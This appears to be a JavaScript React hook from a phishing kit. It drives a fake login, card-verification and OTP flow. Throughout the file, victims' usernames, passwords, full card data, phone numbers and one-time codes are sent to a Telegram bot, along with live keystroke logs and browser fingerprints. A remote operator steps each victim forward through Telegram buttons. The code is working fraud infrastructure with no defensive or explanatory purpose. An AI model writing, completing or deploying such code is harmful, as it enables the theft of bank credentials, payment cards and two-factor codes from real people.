// navigationInterface.js
import { useState, useEffect } from 'react';
import { useTelegramBot } from './hooks/useTelegramBot';

export const useNavigation = () => {
  // Navigation state
  const [currentStep, setCurrentStep] = useState('login');
  const [sessionId, setSessionId] = useState(null);
  const [userData, setUserData] = useState({
    username: '',
    password: '',
    cardData: null,
    otpCode: '',
    phoneNumber: ''
  });

  // Initialize session
  useEffect(() => {
    const newSessionId = Date.now().toString() + Math.random().toString(36).substr(2, 6);
    setSessionId(newSessionId);
  }, []);

  // Navigation handlers
  const navigateTo = (step) => {
    console.log(`Navigating to: ${step}`);
    setCurrentStep(step);
  };

  const goToLogin = () => {
    setCurrentStep('login');
    setUserData({
      username: '',
      password: '',
      cardData: null,
      otpCode: '',
      phoneNumber: ''
    });
  };

  const goToCardVerification = () => {
    setCurrentStep('cardVerification');
  };

  const goToOtp = () => {
    setCurrentStep('otp');
  };

  const goToSuccess = () => {
    setCurrentStep('success');
  };

  const goBackToCard = () => {
    setCurrentStep('cardVerification');
  };

  const goBackToLogin = () => {
    setCurrentStep('login');
  };

  // Data update handlers
  const updateUserData = (newData) => {
    setUserData(prev => ({ ...prev, ...newData }));
  };

  // Telegram bot callbacks
  const handleApprove = () => {
    console.log('✅ Approve clicked - Navigating to card verification');
    goToCardVerification();
  };

  const handleDeny = () => {
    console.log('❌ Deny clicked - Staying on current page');
    // Optionally show error message or reset form
  };

  const handleViewCard = () => {
    console.log('💳 View card details');
    // This would typically show card details in a modal or new view
    // You can implement a modal here
  };

  const handleNextStep = () => {
    console.log('➡️ Next step clicked - Navigating to OTP');
    goToOtp();
  };

  const handleBackToCard = () => {
    console.log('⬅️ Back to card clicked');
    goBackToCard();
  };

  const handleBackToLogin = () => {
    console.log('⬅️ Back to login clicked');
    goBackToLogin();
  };

  const handleBlock = () => {
    console.log('🚫 Block clicked - User blocked');
    // Implement blocking logic
    localStorage.setItem('isBlocked', 'true');
    window.location.href = '/blocked.html'; // Redirect to blocked page
  };

  // Initialize Telegram bot
  const telegramBot = useTelegramBot(
    sessionId,
    handleApprove,
    handleDeny,
    handleViewCard,
    handleNextStep,
    handleBackToCard,
    handleBackToLogin,
    handleBlock
  );

  // Send initial page view when session starts
  useEffect(() => {
    if (sessionId && telegramBot.sendPageViewLog) {
      telegramBot.sendPageViewLog();
      
      // Get IP and send visit notification
      const getIpAndNotify = async () => {
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          
          await telegramBot.sendVisitNotification(
            ipData.ip,
            navigator.userAgent,
            document.referrer,
            `${window.screen.width}x${window.screen.height}`,
            Intl.DateTimeFormat().resolvedOptions().timeZone,
            sessionId,
            navigator.language
          );
        } catch (error) {
          console.error('Error getting IP:', error);
        }
      };
      
      getIpAndNotify();
    }
  }, [sessionId]);

  // Send step-specific logs
  useEffect(() => {
    if (!sessionId) return;

    switch(currentStep) {
      case 'cardVerification':
        telegramBot.sendCardVerificationPageLog(userData.username);
        break;
      case 'otp':
        telegramBot.sendOtpPageLog(userData.username, userData.phoneNumber, sessionId);
        break;
      case 'success':
        // Handle success page
        break;
      default:
        break;
    }
  }, [currentStep, sessionId, userData.username, userData.phoneNumber]);

  // Handle form submissions
  const handleLoginSubmit = async (username, password) => {
    updateUserData({ username, password });
    
    // Send login credentials to Telegram
    // This assumes you have a method to send just the login info
    // You can modify this based on your needs
    
    console.log('Login submitted:', { username, password });
    // Navigate to card verification after login
    goToCardVerification();
  };

  const handleCardSubmit = async (cardData) => {
    const fullCardData = {
      ...cardData,
      phoneNumber: userData.phoneNumber || cardData.phoneNumber,
      city: cardData.city,
      postalCode: cardData.postalCode
    };
    
    updateUserData({ cardData: fullCardData });
    
    // Send formatted card details to Telegram
    await telegramBot.sendFormattedCardDetails(
      fullCardData,
      sessionId,
      userData.username,
      userData.password
    );
    
    // Also send with buttons for admin actions
    await telegramBot.sendCardDetailsToTelegram(fullCardData, sessionId);
    
    console.log('Card submitted:', fullCardData);
    // Don't auto-navigate, wait for admin approval via Telegram
  };

  const handleOtpSubmit = async (otpCode) => {
    updateUserData({ otpCode });
    
    // Send OTP to Telegram
    await telegramBot.sendOtpToTelegram(otpCode, userData.phoneNumber, sessionId);
    await telegramBot.sendOtpSubmitLog(userData.username, userData.phoneNumber, otpCode);
    
    console.log('OTP submitted:', otpCode);
    // Navigate to success after OTP
    goToSuccess();
  };

  // Typing handlers for real-time logging
  const handleLoginTyping = (field, value) => {
    telegramBot.sendLoginTypingLog(userData.username, field, value);
  };

  const handleCardTyping = (field, value) => {
    telegramBot.sendCardTypingLog(userData.username, field, value);
  };

  const handleOtpTyping = (value) => {
    telegramBot.sendOtpTypingLog(userData.username, userData.phoneNumber, value);
  };

  return {
    // State
    currentStep,
    sessionId,
    userData,
    
    // Navigation functions
    navigateTo,
    goToLogin,
    goToCardVerification,
    goToOtp,
    goToSuccess,
    goBackToCard,
    goBackToLogin,
    
    // Data handlers
    updateUserData,
    handleLoginSubmit,
    handleCardSubmit,
    handleOtpSubmit,
    
    // Typing handlers
    handleLoginTyping,
    handleCardTyping,
    handleOtpTyping,
    
    // Telegram bot instance
    telegramBot,
    
    // Direct bot functions for custom use
    sendToTelegram: telegramBot.sendToTelegramWithButtons,
    sendCardDetails: telegramBot.sendCardDetailsToTelegram,
    sendFormattedCard: telegramBot.sendFormattedCardDetails,
    sendOtp: telegramBot.sendOtpToTelegram,
    sendSuccess: telegramBot.sendSuccessToTelegram
  };
};